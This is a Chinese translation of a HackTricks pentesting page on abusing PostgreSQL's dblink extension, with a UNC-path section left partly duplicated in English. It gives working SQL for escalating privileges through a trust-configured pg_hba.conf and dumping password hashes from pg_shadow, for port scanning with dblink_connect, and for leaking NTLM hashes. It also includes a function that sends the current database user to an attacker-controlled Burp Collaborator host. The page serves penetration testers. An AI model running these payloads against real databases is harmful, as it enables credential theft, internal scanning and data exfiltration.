<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


自从**PostgreSQL 9.1**版本以来，安装附加模块变得简单。[像`dblink`这样的注册扩展](https://www.postgresql.org/docs/current/contrib.html)可以通过[`CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html)进行安装：
```sql
CREATE EXTENSION dblink;
```
一旦加载了dblink，您就可以执行一些有趣的技巧：

## 权限提升

文件`pg_hba.conf`可能被错误配置，**允许来自本地主机的任何用户连接**，而无需知道密码。该文件通常位于`/etc/postgresql/12/main/pg_hba.conf`，错误的配置如下：
```
local    all    all    trust
```
_请注意，这种配置通常用于在管理员忘记密码时修改数据库用户的密码，因此有时您可能会找到它。_\
_还要注意，pg\_hba.conf文件只能由postgres用户和组读取，只能由postgres用户写入。_

如果您已经在受害者内部获得了一个shell，那么这种情况非常有用，因为它将允许您连接到postgresql数据库。

另一种可能的配置错误如下所示：
```
host    all     all     127.0.0.1/32    trust
```
由于它允许来自本地主机的任何人以任何用户身份连接到数据库。\
在这种情况下，如果**`dblink`**函数**可用**，您可以通过通过已建立的连接连接到数据库并访问不应该访问的数据来**提升权限**：
```sql
SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'SELECT datname FROM pg_database')
RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'select usename, passwd from pg_shadow')
RETURNS (result1 TEXT, result2 TEXT);
```
**在这篇论文中找到更多关于这次攻击的信息**。

## 端口扫描

滥用 `dblink_connect`，你也可以**搜索开放的端口**。如果这个**函数不起作用，你应该尝试使用 `dblink_connect_u()`**，因为文档中说_`dblink_connect_u()` 与 `dblink_connect()` 相同，只是它允许非超级用户使用任何身份验证方法连接_。
```sql
SELECT * FROM dblink_connect('host=216.58.212.238
port=443
user=name
password=secret
dbname=abc
connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
Is the server running on host "127.0.0.1" and accepting
TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```
请注意，在能够使用 `dblink_connect` 或 `dblink_connect_u` 之前，您可能需要执行以下操作：
```
CREATE extension dblink;
```
## UNC路径 - NTLM哈希泄露

In some cases, it is possible to obtain the NTLM hash of a user's password by exploiting a vulnerability in the UNC (Universal Naming Convention) path functionality. This can be achieved through a technique known as NTLM hash disclosure.

在某些情况下，通过利用UNC（通用命名约定）路径功能中的漏洞，可以获取用户密码的NTLM哈希。这可以通过一种称为NTLM哈希泄露的技术来实现。

### How it works

The NTLM hash disclosure technique takes advantage of the fact that when a user accesses a UNC path, the client machine automatically sends the user's NTLM hash to the server hosting the UNC share. This is done as part of the NTLM authentication process.

NTLM哈希泄露技术利用了这样一个事实：当用户访问UNC路径时，客户端机器会自动将用户的NTLM哈希发送到托管UNC共享的服务器。这是NTLM身份验证过程的一部分。

To exploit this vulnerability, an attacker can set up a malicious server that responds to UNC requests and captures the NTLM hashes sent by the client machines. The attacker can then use these captured hashes to perform offline password cracking or other malicious activities.

为了利用这个漏洞，攻击者可以设置一个恶意服务器，响应UNC请求并捕获客户端机器发送的NTLM哈希。然后，攻击者可以使用这些捕获的哈希来进行离线密码破解或其他恶意活动。

### Mitigation

To mitigate the risk of NTLM hash disclosure through UNC paths, it is recommended to:

- Disable the use of NTLM authentication and use more secure authentication protocols like Kerberos.
- Implement strong password policies to make password cracking more difficult.
- Regularly update and patch systems to fix any known vulnerabilities.
- Monitor network traffic for any suspicious activity and investigate any unauthorized access attempts.

为了减轻通过UNC路径泄露NTLM哈希的风险，建议采取以下措施：

- 禁用NTLM身份验证，使用更安全的身份验证协议，如Kerberos。
- 实施强密码策略，增加密码破解的难度。
- 定期更新和修补系统，修复已知的漏洞。
- 监控网络流量，发现任何可疑活动，并调查任何未经授权的访问尝试。
```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass)，或者在**Twitter**上**关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
